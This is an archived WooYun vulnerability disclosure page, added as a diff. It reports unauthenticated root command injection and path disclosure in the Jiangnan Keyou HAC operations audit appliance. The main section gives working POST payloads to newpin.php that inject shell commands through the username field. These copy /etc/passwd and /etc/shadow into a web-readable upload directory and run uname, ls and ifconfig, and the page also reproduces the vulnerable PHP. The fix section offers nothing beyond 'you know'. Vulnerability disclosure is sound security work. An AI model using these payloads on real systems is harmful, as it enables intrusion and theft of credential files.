@@ -1,0 +1,269 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		江南科友HAC运维审计系统存在命令注入及暴路径漏洞（无需登录）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		江南科友HAC运维审计系统存在命令注入及暴路径漏洞（无需登录）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2014-02-18 23:42</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-26：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-15：	细节向普通白帽子公开<br/>
+									2014-04-04：	细节向实习白帽子公开<br/>
+									2014-05-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">先说：非struts2。root权限，好爽的。不用登录，更爽的！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">HAC的登录界面截图如下：<br />
+<br />
+</p><p class="detail"><a href="../images/18210324799d059ba5bfcfaccfa38129369d1de4.png" target="_blank"><img src="../images/18210324799d059ba5bfcfaccfa38129369d1de4.png" alt="image126.png" width="600"/></a></p><p class="detail"><br />
+<br />
+运维审计系统到底有多重要，就不用提了吧？有了这台服务器到底会有多少东西沦陷，这就不必说了。<br />
+<br />
+<br />
+<br />
+以下的测试都是在内网进行的<br />
+<br />
+先说个暴路径的。<br />
+<br />
+post提交以下数据<br />
+<br />
+https://10.100.113.11/login.php<br />
+<br />
+password_check=1&amp;account=1&amp;password=1&amp;usb_code=&amp;certcn[]=&amp;randvalue=1366349330&amp;notifypwd=<br />
+<br />
+其实就是certcn[]做了点处理，然后就暴了路径：<br />
+<br />
+</p><p class="detail"><a href="../images/1821054380d0646bc1f663a8be8f37157c43c82c.png" target="_blank"><img src="../images/1821054380d0646bc1f663a8be8f37157c43c82c.png" alt="image128.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>&lt;b&gt;Warning&lt;/b&gt;:  explode() expects parameter 2 to be string, array given in &lt;b&gt;/usr/local/apache2/htdocs/project/www/login.php&lt;/b&gt; on line &lt;b&gt;38&lt;/b&gt;&lt;br /&gt;</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">再说命令注入的问题，问题就产生在根目录下的newpin.php文件，这个应该是添加pin码的文件<br />
+<br />
+好几个参数只要在前后附加上&amp;或者|就可以直接执行命令，比如我post以下数据：<br />
+<br />
+https://1.1.1.1/newpin.php<br />
+<br />
+username=1%26cp+%2Fetc%2Fpasswd+%2Fusr%2Flocal%2Fapache2%2Fhtdocs%2Fproject%2Fwww%2Fupload%2F1.txt+%26&amp;tokencode=1&amp;pincode=1&amp;pincodes=1&amp;msg=<br />
+<br />
+</p><p class="detail"><a href="../images/1821074631175f456ae54a0f1314b333f1c7ee47.png" target="_blank"><img src="../images/1821074631175f456ae54a0f1314b333f1c7ee47.png" alt="image132.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功将文件复制到upload文件夹下：<br />
+<br />
+</p><p class="detail"><a href="../images/18210810f8d4f90e2e7cca4ab143863216f1e79c.png" target="_blank"><img src="../images/18210810f8d4f90e2e7cca4ab143863216f1e79c.png" alt="image134.png" width="600"/></a></p><p class="detail"><br />
+<br />
+同时也复制了shadow文件：<br />
+<br />
+</p><p class="detail"><a href="../images/18210837f8b507d57d9d428d77e1939d076c0504.png" target="_blank"><img src="../images/18210837f8b507d57d9d428d77e1939d076c0504.png" alt="image136.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+执行：<br />
+<br />
+1 | uname -a &gt;  /usr/local/apache2/htdocs/project/www/upload/12.txt<br />
+<br />
+</p><p class="detail"><a href="../images/18210908a753d3a8ae19090e13b88745ac5ad0f7.png" target="_blank"><img src="../images/18210908a753d3a8ae19090e13b88745ac5ad0f7.png" alt="image130.png" width="600"/></a></p><p class="detail"><br />
+<br />
+系统内核版本为：Linux hac 2.6.15.5hac_2.0 #2 SMP Mon Jun 7 05:13:40 CST 2010 i686 i686 i386 GNU/Linux<br />
+<br />
+<br />
+<br />
+ls -al &gt;  /usr/local/apache2/htdocs/project/www/upload/12.txt<br />
+<br />
+</p><p class="detail"><a href="../images/182110482b39db49523c064e3efda5a20d3a3388.png" target="_blank"><img src="../images/182110482b39db49523c064e3efda5a20d3a3388.png" alt="image137.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1&amp;ifconfig &gt;&gt;/usr/local/apache2/htdocs/project/www/upload/11.txt &amp;<br />
+<br />
+</p><p class="detail"><a href="../images/18211112107517872b5bebc07dcdac559ea0a4c5.png" target="_blank"><img src="../images/18211112107517872b5bebc07dcdac559ea0a4c5.png" alt="image138.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+直接看漏洞文件的源码：<br />
+<br />
+1&amp;cp /usr/local/apache2/htdocs/project/www/newpin.php  /usr/local/apache2/htdocs/project/www/upload/11.txt &amp;<br />
+<br />
+</p><p class="detail"><a href="../images/1821114577bdd1c9df8b06bbc7cd8ea3012dd25d.png" target="_blank"><img src="../images/1821114577bdd1c9df8b06bbc7cd8ea3012dd25d.png" alt="image140.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>assign(&#039;msg&#039;,$msg); $template-&gt;output(); } if($_POST[&#039;username&#039;] &amp;&amp; $_POST[&#039;tokencode&#039;] &amp;&amp; $_POST[&#039;pincode&#039;]) { $cmd=MYSUDO.&quot;/usr/local/keyou/Bin/tokencheck &quot;.$_POST[&#039;username&#039;].&quot; &quot;. $_POST[&#039;tokencode&#039;].&quot; &quot;.$_POST[&#039;pincode&#039;]; $rtn =HacExec($cmd,$output); if($rtn) { $msg=&quot;新PIN设置失败！&quot;; } else $msg=&quot;新PIN码已被认证服务器接受！&quot;; showPage($msg); exit; } showPage(NULL); exit(); ?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$cmd=MYSUDO.&quot;/usr/local/keyou/Bin/tokencheck &quot;.$_POST[&#039;username&#039;].&quot; &quot;. $_POST[&#039;tokencode&#039;].&quot; &quot;.$_POST[&#039;pincode&#039;]<br />
+<br />
+虽然我PHP很弱，但是一看就有命令注入啊………………<br />
+<br />
+<br />
+<br />
+再看看首页源码：<br />
+<br />
+1&amp;cp /usr/local/apache2/htdocs/project/www/login.php /usr/local/apache2/htdocs/project/www/upload/11.txt &amp;<br />
+<br />
+</p><p class="detail"><a href="../images/18211259f431b0732b4ffa5a445b99d14cdcd0d7.png" target="_blank"><img src="../images/18211259f431b0732b4ffa5a445b99d14cdcd0d7.png" alt="image142.png" width="600"/></a></p><p class="detail"><br />
+<br />
+&lt;?php<br />
+<br />
+require_once(&#039;include.php&#039;);<br />
+<br />
+require_once &#039;./admin/SystemDB.php&#039;;<br />
+<br />
+admin/SystemDB.php可能是和数据库有关的。<br />
+<br />
+<br />
+<br />
+源码都在这了，截图一个：<br />
+<br />
+</p><p class="detail"><a href="../images/18211339c36030783112c75580bb25d9102d12f2.png" target="_blank"><img src="../images/18211339c36030783112c75580bb25d9102d12f2.png" alt="image146.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/18211354bed3b6e70edea27efd0565647b53d80e.png" target="_blank"><img src="../images/18211354bed3b6e70edea27efd0565647b53d80e.png" alt="image148.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你懂的。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051345" title="江南科友HAC运维审计系统存在命令注入及暴路径漏洞（无需登录）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：11 </p>
+													<p class="detail">确认时间：2014-02-23 11:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51345";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
